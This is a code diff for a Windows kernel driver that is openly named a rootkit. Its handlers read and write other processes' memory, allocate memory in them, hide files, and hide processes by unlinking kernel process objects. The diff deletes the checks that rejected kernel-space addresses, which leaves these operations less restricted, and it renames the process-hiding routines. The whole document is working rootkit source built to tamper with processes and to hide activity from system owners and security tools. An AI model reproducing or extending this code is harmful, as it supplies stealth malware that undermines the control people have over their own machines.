@@ -154,13 +154,6 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	}
 
 
-	// Check for KM addresses (not allowed for this function):
-	if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (one or more of the buffers are in systemspace: %p, %p)\n", RootkInst->Buffer, RootkInst->Out);
-		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-	}
-
-
 	// Destination EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of destination process %llu)\n", RootkInst->MainPID);
@@ -396,13 +389,6 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	}
 
 
-	// Check for KM addresses (not allowed for this function):
-	if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (one or more addresses are in KM: %p, %p)\n", RootkInst->Buffer, RootkInst->Out);
-		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-	}
-
-
 	// Destination process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpTo))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get destination process %llu EPROCESS)\n", RootkInst->SemiPID);
@@ -513,13 +499,6 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 	}
 
 
-	// Check for KM address (not allowed for this function):
-	if ((ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (attribute buffer is in systemspace; %p)\n", RootkInst->Buffer);
-		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-	}
-
-
 	// Iterate through the system info requests for part 1 (get each infotype from types buffer, query for system information and save the results in the original buffer):
 	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
 		Status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
@@ -623,13 +602,6 @@ NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 	}
 
 
-	// Check for KM address (not allowed for this function):
-	if ((ULONG64)InitialAddress >= memory_helpers::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (the allocation address %p is in systemspace)\n", InitialAddress);
-		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-	}
-
-
 	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (cannot get EPROCESS of process %llu)\n", RootkInst->MainPID);
@@ -665,29 +637,6 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 		if ((RootkInst->Out == NULL && (ULONG64)RootkInst->Reserved == HIDE_FILE) || RootkInst->Buffer == NULL || (RootkInst->MedPID == 0 && RootkInst->MainPID == 0) || RootkInst->Size == 0) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (one or more invalid parameters: %p, %p, %llu, %llu, %llu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->MedPID, RootkInst->MainPID, RootkInst->Size);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
-		}
-	}
-
-
-	// Check for KM source string address (not allowed for this function) or UM output string address (also not allowed):
-	if ((ULONG64)RootkInst->Reserved == HIDE_FILE) {
-		if ((ULONG64)RootkInst->Buffer >= memory_helpers::GetHighestUserModeAddrADD()) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source string address %p is in systemspace)\n", RootkInst->Buffer);
-			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-		}
-		//if ((ULONG64)RootkInst->Out < memory_helpers::GetHighestUserModeAddrADD()) {
-		//	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination string address %p is in userspace)\n", RootkInst->Out);
-		//	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-		//}
-	}
-	else if ((ULONG64)RootkInst->Reserved == SHOW_HIDDEN) {
-		//if ((ULONG64)RootkInst->Buffer < memory_helpers::GetHighestUserModeAddrADD()) {
-		//	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the source list address %p is in userspace)\n", RootkInst->Buffer);
-		//	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-		//}
-		if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD()) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide file object failed (the destination list address %p is in systemspace)\n", RootkInst->Out);
-			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 	}
 
@@ -748,25 +697,29 @@ NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst) {
 
 NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 	// TODO: MAKE SURE MEDIUM GETS PID IF RIGHT, IF NOT RETURNS VIA THE MODULE NAME STRING INITAL OPERATION
-	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM (process with PID = %llu)\n", RootkInst->MainPID);
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM (process with PID = %llu, index = %llu)\n", RootkInst->MainPID, RootkInst->SemiPID);
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	PEPROCESS MediumProcess = { 0 };
 	KAPC_STATE MediumState = { 0 };
 	PVOID TempOutput = NULL;
 	PVOID HiddenInput = NULL;
 	ULONG64 TempSize = 0;
+	ULONG64 ProcessManType = (ULONG64)RootkInst->Reserved;
 
 
 	// Check for invalid arguments:
-	if ((RootkInst->MainPID == 0 && RootkInst->Size != 2) || !(RootkInst->Size == 0 || RootkInst->Size == 1 || RootkInst->Size == 2) || (RootkInst->Size == 2 && RootkInst->MedPID == 0) || (RootkInst->Size == 2 && RootkInst->Out == NULL)) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (invalid PID: %llu, %llu, %llu / invalid request number: %llu / invalid output buffer: %p)\n", RootkInst->MainPID, RootkInst->SemiPID, RootkInst->MedPID, RootkInst->Size, RootkInst->Out);
+	if ((RootkInst->MainPID == 0 && ProcessManType != ListHiddenProcesses) ||
+		!(ProcessManType == HideProcess || ProcessManType == UnhideProcess || ProcessManType == ListHiddenProcesses) ||
+		(ProcessManType == ListHiddenProcesses && RootkInst->MedPID == 0) ||
+		(ProcessManType == ListHiddenProcesses && RootkInst->Out == NULL)) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (invalid PID: %llu, %llu, %llu / invalid request number: %llu / invalid output buffer: %p)\n", RootkInst->MainPID, RootkInst->SemiPID, RootkInst->MedPID, ProcessManType, RootkInst->Out);
 		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Pass PID of process to DKOM function:
-	if (RootkInst->Size == 0) {
-		Status = process::HideProcess(RootkInst->MainPID, TRUE);
+	if (ProcessManType == HideProcess) {
+		Status = process::DKHideProcess(RootkInst->MainPID, TRUE);
 		if (Status == STATUS_NOT_FOUND) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
@@ -777,33 +730,33 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 		}
 		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide process via DKOM succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
 	}
-	else if (RootkInst->Size == 1) {
-		if (RootkInst->SemiPID != 0) {
-			Status = process::UnhideProcess(RootkInst->MainPID, (ULONG)RootkInst->SemiPID);  // Remove via index
+	else if (ProcessManType == UnhideProcess) {
+		if (RootkInst->MainPID == REMOVE_BY_INDEX_PID) {
+			Status = process::DKUnhideProcess(REMOVE_BY_INDEX_PID, (ULONG)RootkInst->SemiPID);  // Remove via index
+			if (Status == STATUS_NOT_FOUND) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process at index %llu)\n", RootkInst->SemiPID);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
+			}
 		}
 		else {
-			Status = process::UnhideProcess(RootkInst->MainPID, 0);  // Remove via PID
+			Status = process::DKUnhideProcess(RootkInst->MainPID, 0);  // Remove via PID
+			if (Status == STATUS_NOT_FOUND) {
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
+				return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
+			}
 		}
-		if (Status == STATUS_NOT_FOUND) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (did not find process with PID of %llu)\n", RootkInst->MainPID);
-			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_NOT_FOUND, RootkInst);
-		}
-		else if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (unhiding function with PID of %llu failed with status 0x%x)\n", RootkInst->MainPID, Status);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM failed (unhiding function with PID of %llu / index of %llu failed with status 0x%x)\n", RootkInst->MainPID, RootkInst->SemiPID, Status);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM succeeded, hidden process with PID of %llu\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide process via DKOM succeeded, unhidden process with PID %llu / index %llu\n", RootkInst->MainPID, RootkInst->SemiPID);
 	}
 	else {
-		if ((ULONG64)RootkInst->Out >= memory_helpers::GetHighestUserModeAddrADD()) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (the destination list address %p is in systemspace)\n", RootkInst->Out);
-			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
-		}
 		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		if (!NT_SUCCESS(process::ListHiddenProcesses(&TempSize, &HiddenInput))) {
+		if (!NT_SUCCESS(process::DKListHiddenProcesses(&TempSize, &HiddenInput))) {
 			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden processes via DKOM failed (Error in ListHiddenProcesses())\n");
 			if (HiddenInput != NULL) {
 				ExFreePool(HiddenInput);
